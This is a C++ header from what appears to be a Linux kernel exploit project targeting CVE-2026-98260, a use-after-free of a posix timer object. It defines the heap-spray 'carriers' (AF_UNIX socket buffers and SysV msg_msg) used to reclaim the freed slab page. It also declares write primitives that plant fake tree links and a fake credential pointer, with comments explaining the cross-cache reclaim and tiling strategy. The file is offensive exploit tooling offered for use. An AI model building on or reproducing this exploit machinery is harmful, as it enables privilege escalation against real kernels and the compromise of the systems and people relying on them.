#ifndef PAGE_CARRIER_H
#define PAGE_CARRIER_H

#include <array>
#include <cstddef>
#include <cstdint>
#include <memory>

namespace ghostlock::reclaim {

/* Reclaim carriers for CVE-2026-98260.
 *
 * The bug frees a `struct k_itimer` while its timerqueue node is still linked in
 * `posix_cputimers`; the page the exploit has to win back is the `posix_timers`
 * SLUB slab -- order-1, 8 KiB, 21 objects of 0x180. Two carriers were measured
 * to be able to land there, and they differ in *geometry* only:
 *
 *   AF_UNIX SOCK_STREAM  `skb->head` for payloads <= SKB_MAX_HEAD(0)
 *                        (PAGE_SIZE - SKB_DATA_ALIGN(sizeof(skb_shared_info))),
 *                        page fragments above that (net/unix/af_unix.c);
 *   SysV msgsnd          one `msg_msg` chunk of at most PAGE_SIZE with our bytes
 *                        from offset 0x30, then 0x1000-sized segments
 *                        (ipc/msgutil.c, DATALEN_MSG / DATALEN_SEG).
 *
 * Everything above geometry is shared, in particular the only two operations the
 * fake node needs -- the same pair the write primitive exposes:
 *
 *   write_zero(page_offset)     store a NULL link;
 *   write_pointer(page_offset)  store a kernel pointer link (the rb parent/child
 *                              a walk will follow, or the fake cred pointer the
 *                              erase plants for it).
 *
 * Both write one 8-byte word at a page-relative offset and, with a non-zero
 * `stride`, tile it across the window. Tiling is what makes an unknown landing
 * alignment still hit a valid copy: a cross-cache carrier rarely starts at the
 * page base, so the fake node is replicated at every object boundary.
 */

constexpr size_t kTargetPageBytes = 8192;   /* posix_timers: order-1, 8 KiB */
constexpr size_t kSlabObjectBytes = 0x180;  /* sizeof(struct k_itimer) */
constexpr size_t kWordBytes = sizeof(uintptr_t);

enum class CarrierKind : std::uint8_t { kUnixSkb = 0, kMsgMsg = 1 };

enum class CarrierStatus : std::int8_t {
  kOk = 0,
  kInvalid = -1,  /* payload/offset outside the carrier window */
  kNoMemory = -2, /* the kernel allocation failed */
  kIo = -3,       /* transport syscall failed */
  kGone = -4,     /* the object is no longer ours (consumed or reclaimed) */
};

constexpr bool carrier_ok(CarrierStatus status) noexcept {
  return status == CarrierStatus::kOk;
}

/* Where one allocation lands and how much of it is ours. A `capacity` of 0 means
 * the requested payload does not fit this carrier; `data_offset + capacity` is
 * always <= `page_bytes`. */
struct CarrierGeometry {
  size_t page_bytes;
  size_t data_offset;
  size_t capacity;
};

/* Pure geometry math, so the host tests can pin the numbers without touching a
 * Linux syscall. Both return capacity 0 for an out-of-range payload. */
CarrierGeometry unix_skb_geometry(size_t payload_bytes) noexcept;
CarrierGeometry msg_msg_geometry(size_t payload_bytes) noexcept;
bool geometry_valid(const CarrierGeometry &geometry) noexcept;

/* arm64 5.15 limits, constexpr so the backends can size their transport buffers
 * from them:
 *   SKB_MAX_HEAD(0) = PAGE_SIZE - SKB_DATA_ALIGN(sizeof(struct skb_shared_info))
 *                   = 4096 - 320                       (MAX_SKB_FRAGS = 17)
 *   DATALEN_MSG     = PAGE_SIZE - sizeof(struct msg_msg)
 *                   = 4096 - 0x30
 * A larger unix send moves its tail into page fragments and a larger msg_msg
 * continues in 0x1000 segments; both are different carriers, not this one. */
constexpr size_t kPageBytes = 4096;
constexpr size_t kSkbSharedInfoBytes = 320;
constexpr size_t kMsgMsgHeaderBytes = 0x30;

constexpr size_t unix_skb_max_payload() noexcept {
  return kPageBytes - kSkbSharedInfoBytes;
}

constexpr size_t msg_msg_max_payload() noexcept {
  return kPageBytes - kMsgMsgHeaderBytes;
}

class PageCarrier {
 public:
  virtual ~PageCarrier() = default;
  PageCarrier(const PageCarrier &) = delete;
  PageCarrier &operator=(const PageCarrier &) = delete;

  virtual CarrierKind kind() const noexcept = 0;
  virtual const CarrierGeometry &geometry() const noexcept = 0;

  /* Allocate the kernel object (the transport is opened here). */
  virtual CarrierStatus acquire() noexcept = 0;
  /* Push the staging page into the kernel object. */
  virtual CarrierStatus commit() noexcept = 0;
  /* Read what the kernel left in the object back into the staging page; this is
   * the verification/leak oracle for the stage that runs after the erase. */
  virtual CarrierStatus fetch() noexcept = 0;
  /* Release the object and the transport; safe to call twice. */
  virtual CarrierStatus release() noexcept = 0;

  /* The two exported writes. `page_offset` is relative to the target page, not
   * to the window: the base class subtracts `data_offset` and rejects anything
   * the allocation cannot reach. */
  CarrierStatus write_zero(size_t page_offset, size_t stride = 0) noexcept;
  CarrierStatus write_pointer(size_t page_offset, uintptr_t pointer,
                              size_t stride = 0) noexcept;

  unsigned char *staging() noexcept { return staging_.data(); }
  const unsigned char *staging() const noexcept { return staging_.data(); }
  size_t payload_bytes() const noexcept { return geometry_.capacity; }

 protected:
  explicit PageCarrier(CarrierGeometry geometry) noexcept;

  /* Window offset of a page offset, or capacity (i.e. out of range). */
  size_t window_offset(size_t page_offset) const noexcept;

  CarrierGeometry geometry_{};
  std::array<unsigned char, kTargetPageBytes> staging_{};
  bool committed_ = false;
};

std::unique_ptr<PageCarrier> make_unix_skb_carrier(size_t payload_bytes);
std::unique_ptr<PageCarrier> make_msg_msg_carrier(size_t payload_bytes);

}  // namespace ghostlock::reclaim

#endif  // PAGE_CARRIER_H
